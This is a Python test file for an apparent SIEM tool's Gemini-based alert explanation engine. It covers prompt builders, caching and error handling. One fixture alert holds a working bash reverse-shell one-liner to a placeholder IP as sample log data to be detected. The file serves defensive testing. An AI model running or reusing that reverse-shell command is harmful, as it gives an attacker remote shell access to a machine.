"""
test_reasoning.py — Tests for v4 AI reasoning components

Covers:
  - GeminiClient: configuration detection, cache, rate limit structure
  - Prompt builders: all 6 templates produce non-empty, well-formed prompts
  - ReasoningEngine: all public methods callable, return correct AIResult type
  - Constraint validation: prompts contain required constraint language
  - Error handling: unconfigured client, empty alert lists
"""

import asyncio
import pytest
from unittest.mock import AsyncMock, MagicMock, patch

from nano_siem.reasoning.gemini import GeminiClient, GeminiResponse
from nano_siem.reasoning.engine import ReasoningEngine, AIResult
from nano_siem.reasoning.prompts import (
    analyst_explanation_prompt,
    incident_summary_prompt,
    mitre_explanation_prompt,
    recommended_actions_prompt,
    executive_report_prompt,
    threat_narrative_prompt,
    SYSTEM_INSTRUCTION,
    _format_alert,
)


# ── Test data ─────────────────────────────────────────────────────────────────

SAMPLE_ALERT = {
    "alert_id": "abc12345-0000-0000-0000-000000000000",
    "alert_type": "sigma",
    "title": "SSH Brute Force Attempt",
    "severity": "high",
    "source_key": "203.0.113.5",
    "event_message": "Failed password for root from 203.0.113.5 port 22 ssh2",
    "timestamp": 1748870401.0,
    "hit_count": 3,
    "anomaly_score": 0.783,
    "mitre_tactic": "Credential Access",
    "mitre_techniques": ["T1110.001"],
    "chain_steps": [],
    "xai_features": [
        {"feature": "has_failure_keyword", "deviation": 1.0},
        {"feature": "is_off_hours", "deviation": 0.84},
    ],
    "sigma_tags": ["attack.t1110.001", "attack.credential_access"],
    "fingerprint": "abc123def456",
    "duration_seconds": 60.0,
}

SAMPLE_CHAIN_ALERT = {
    "alert_id": "def45678-0000-0000-0000-000000000000",
    "alert_type": "correlation",
    "title": "Brute Force Followed by Successful Login",
    "severity": "critical",
    "source_key": "203.0.113.5",
    "event_message": "Accepted password for deploy from 203.0.113.5",
    "timestamp": 1748870461.0,
    "hit_count": 1,
    "anomaly_score": 1.0,
    "mitre_tactic": "Credential Access → Initial Access",
    "mitre_techniques": ["T1110", "T1078"],
    "chain_steps": [
        {"step": "brute_force", "message": "Failed password for root"},
        {"step": "successful_login", "message": "Accepted password for deploy"},
    ],
    "xai_features": [],
    "sigma_tags": [],
    "fingerprint": "def456abc123",
    "duration_seconds": 60.0,
}

SAMPLE_ML_ALERT = {
    "alert_id": "ghi78901-0000-0000-0000-000000000000",
    "alert_type": "ml",
    "title": "ML Anomaly Detected (score=0.987)",
    "severity": "high",
    "source_key": "203.0.113.5",
    "event_message": "/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
    "timestamp": 1748870521.0,
    "hit_count": 1,
    "anomaly_score": 0.987,
    "mitre_tactic": "",
    "mitre_techniques": [],
    "chain_steps": [],
    "xai_features": [
        {"feature": "is_off_hours", "deviation": 0.84},
        {"feature": "source_ip_is_rfc1918", "deviation": 0.75},
        {"feature": "dest_port_norm", "deviation": 0.99},
    ],
    "sigma_tags": [],
    "fingerprint": "ghi789def012",
    "duration_seconds": 0.0,
}


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


# ── GeminiClient tests ────────────────────────────────────────────────────────

class TestGeminiClient:
    def test_unconfigured_when_no_key(self):
        client = GeminiClient(api_key="")
        assert not client.is_configured

    def test_unconfigured_when_placeholder(self):
        client = GeminiClient(api_key="YOUR_API_KEY_HERE")
        assert not client.is_configured

    def test_configured_when_key_set(self):
        client = GeminiClient(api_key="AIzaSyFakeKeyForTesting1234567890abcdef")
        assert client.is_configured

    def test_generate_raises_when_unconfigured(self):
        client = GeminiClient(api_key="")
        with pytest.raises(RuntimeError, match="API key"):
            run(client.generate("test prompt"))

    def test_cache_stores_response(self):
        client = GeminiClient(api_key="fake-key")
        response = GeminiResponse(text="cached", model="gemini-1.5-flash",
                                   prompt_tokens=10, output_tokens=5)
        cache_key = "None||test prompt"
        client._cache[cache_key] = response
        # Verify cache structure
        assert cache_key in client._cache
        assert client._cache[cache_key].text == "cached"

    def test_clear_cache(self):
        client = GeminiClient(api_key="fake-key")
        client._cache["key"] = MagicMock()
        client.clear_cache()
        assert len(client._cache) == 0

    def test_default_model(self):
        client = GeminiClient(api_key="fake")
        assert "flash" in client._model or "gemini" in client._model


# ── Prompt builder tests ──────────────────────────────────────────────────────

class TestPromptBuilders:
    def test_format_alert_includes_title(self):
        result = _format_alert(SAMPLE_ALERT)
        assert "SSH Brute Force Attempt" in result

    def test_format_alert_includes_severity(self):
        result = _format_alert(SAMPLE_ALERT)
        assert "HIGH" in result.upper() or "high" in result

    def test_format_alert_includes_source(self):
        result = _format_alert(SAMPLE_ALERT)
        assert "203.0.113.5" in result

    def test_format_alert_includes_message(self):
        result = _format_alert(SAMPLE_ALERT)
        assert "Failed password" in result

    def test_format_alert_includes_mitre(self):
        result = _format_alert(SAMPLE_ALERT)
        assert "T1110" in result

    def test_format_alert_includes_xai(self):
        result = _format_alert(SAMPLE_ALERT)
        assert "has_failure_keyword" in result or "XAI" in result

    def test_analyst_explanation_prompt_nonempty(self):
        p = analyst_explanation_prompt(SAMPLE_ALERT)
        assert len(p) > 200

    def test_analyst_prompt_contains_required_sections(self):
        p = analyst_explanation_prompt(SAMPLE_ALERT)
        assert "investigation" in p.lower() or "investigate" in p.lower()
        assert "escalat" in p.lower()

    def test_incident_summary_prompt_nonempty(self):
        p = incident_summary_prompt([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT])
        assert len(p) > 200

    def test_incident_summary_shows_alert_count(self):
        p = incident_summary_prompt([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT])
        assert "2" in p

    def test_incident_summary_empty_list(self):
        p = incident_summary_prompt([])
        assert p == "No alerts provided."

    def test_mitre_prompt_contains_technique(self):
        p = mitre_explanation_prompt(SAMPLE_ALERT)
        assert "T1110" in p or "Credential" in p

    def test_mitre_prompt_nonempty(self):
        p = mitre_explanation_prompt(SAMPLE_ALERT)
        assert len(p) > 200

    def test_recommended_actions_prompt_nonempty(self):
        p = recommended_actions_prompt(SAMPLE_ALERT)
        assert len(p) > 200

    def test_recommended_actions_has_sections(self):
        p = recommended_actions_prompt(SAMPLE_ALERT)
        assert "IMMEDIATE" in p or "immediate" in p.lower()
        assert "INVESTIGATE" in p or "investigate" in p.lower()
        assert "REMEDIATE" in p or "remediat" in p.lower()

    def test_executive_report_prompt_nonempty(self):
        p = executive_report_prompt([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT])
        assert len(p) > 200

    def test_executive_report_shows_count(self):
        p = executive_report_prompt([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT, SAMPLE_ML_ALERT])
        assert "3" in p

    def test_executive_report_custom_period(self):
        p = executive_report_prompt([SAMPLE_ALERT], period="last 7 days")
        assert "last 7 days" in p

    def test_threat_narrative_prompt_nonempty(self):
        p = threat_narrative_prompt([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT])
        assert len(p) > 200

    def test_threat_narrative_empty_list(self):
        p = threat_narrative_prompt([])
        assert p == "No alerts provided."

    def test_threat_narrative_has_both_perspectives(self):
        p = threat_narrative_prompt([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT])
        assert "Attacker" in p or "attacker" in p
        assert "Defender" in p or "defender" in p or "Detection" in p


# ── System instruction constraint tests ───────────────────────────────────────

class TestSystemInstruction:
    def test_instruction_forbids_detection(self):
        assert "NEVER" in SYSTEM_INSTRUCTION
        assert "detection" in SYSTEM_INSTRUCTION.lower()

    def test_instruction_requires_only_explain(self):
        assert "explain" in SYSTEM_INSTRUCTION.lower() or "summarize" in SYSTEM_INSTRUCTION.lower()

    def test_instruction_nonempty(self):
        assert len(SYSTEM_INSTRUCTION) > 100

    def test_instruction_mentions_sigma(self):
        assert "Sigma" in SYSTEM_INSTRUCTION

    def test_instruction_mentions_constraint(self):
        assert "CONSTRAINT" in SYSTEM_INSTRUCTION or "detection" in SYSTEM_INSTRUCTION.lower()


# ── ReasoningEngine tests (with mocked Gemini) ────────────────────────────────

class TestReasoningEngine:
    def _make_engine(self) -> tuple[ReasoningEngine, MagicMock]:
        engine = ReasoningEngine(api_key="fake-test-key-for-mocking")
        mock_response = GeminiResponse(
            text="## Analysis\n\nThis is a **test** AI response.\n\n- Action 1\n- Action 2",
            model="gemini-1.5-flash",
            prompt_tokens=100,
            output_tokens=50,
        )
        engine._client.generate = AsyncMock(return_value=mock_response)
        return engine, mock_response

    def test_explain_alert_returns_ai_result(self):
        engine, _ = self._make_engine()
        result = run(engine.explain_alert(SAMPLE_ALERT))
        assert isinstance(result, AIResult)

    def test_explain_alert_success(self):
        engine, _ = self._make_engine()
        result = run(engine.explain_alert(SAMPLE_ALERT))
        assert result.success
        assert result.task == "explain"
        assert len(result.content) > 0

    def test_explain_alert_has_tokens(self):
        engine, mock = self._make_engine()
        result = run(engine.explain_alert(SAMPLE_ALERT))
        assert result.prompt_tokens == 100
        assert result.output_tokens == 50

    def test_summarize_incident_returns_ai_result(self):
        engine, _ = self._make_engine()
        result = run(engine.summarize_incident([SAMPLE_ALERT, SAMPLE_CHAIN_ALERT]))
        assert isinstance(result, AIResult)
        assert result.task == "summary"

    def test_explain_mitre_returns_ai_result(self):
        engine, _ = self._make_engine()
        result = run(engine.explain_mitre(SAMPLE_ALERT))
        assert isinstance(result, AIResult)
        assert result.task == "mitre"

    def test_recommend_actions_returns_ai_result(self):
        engine, _ = self._make_engine()
        result = run(engine.recommend_actions(SAMPLE_ALERT))
        assert isinstance(result, AIResult)
        assert result.task == "recommend"

    def test_executive_report_returns_ai_result(self):
        engine, _ = self._make_engine()
        result = run(engine.generate_executive_report([SAMPLE_ALERT]))
        assert isinstance(result, AIResult)
        assert result.task == "report"

    def test_threat_narrative_returns_ai_result(self):
        engine, _ = self._make_engine()
        result = run(engine.generate_threat_narrative([SAMPLE_ALERT, SAMPLE_ML_ALERT]))
        assert isinstance(result, AIResult)
        assert result.task == "narrative"

    def test_stats_updated_on_call(self):
        engine, _ = self._make_engine()
        run(engine.explain_alert(SAMPLE_ALERT))
        run(engine.recommend_actions(SAMPLE_ALERT))
        s = engine.get_stats()
        assert s["total_calls"] == 2

    def test_to_dict_serializable(self):
        engine, _ = self._make_engine()
        result = run(engine.explain_alert(SAMPLE_ALERT))
        import json
        d = result.to_dict()
        serialized = json.dumps(d)
        assert "explain" in serialized

    def test_error_on_api_failure(self):
        engine = ReasoningEngine(api_key="fake-key")
        engine._client.generate = AsyncMock(side_effect=RuntimeError("API error"))
        result = run(engine.explain_alert(SAMPLE_ALERT))
        assert not result.success
        assert result.error is not None
        assert "API error" in result.error

    def test_error_result_has_empty_content(self):
        engine = ReasoningEngine(api_key="fake-key")
        engine._client.generate = AsyncMock(side_effect=RuntimeError("fail"))
        result = run(engine.explain_alert(SAMPLE_ALERT))
        assert result.content == ""

    def test_is_configured_false_without_key(self):
        engine = ReasoningEngine(api_key="")
        assert not engine.is_configured

    def test_is_configured_true_with_key(self):
        engine = ReasoningEngine(api_key="AIzaSyFakeKey1234567890abcdefghijklmnop")
        assert engine.is_configured

    def test_elapsed_time_recorded(self):
        engine, _ = self._make_engine()
        result = run(engine.explain_alert(SAMPLE_ALERT))
        assert result.elapsed_seconds >= 0.0

    def test_ml_alert_explain(self):
        """ML anomaly alerts (no Sigma/chain) should still explain correctly."""
        engine, _ = self._make_engine()
        result = run(engine.explain_alert(SAMPLE_ML_ALERT))
        assert result.success
        assert result.task == "explain"

    def test_chain_alert_narrative(self):
        """Correlation chain alerts should work for narrative generation."""
        engine, _ = self._make_engine()
        result = run(engine.generate_threat_narrative([SAMPLE_CHAIN_ALERT, SAMPLE_ALERT]))
        assert result.success
        assert result.task == "narrative"
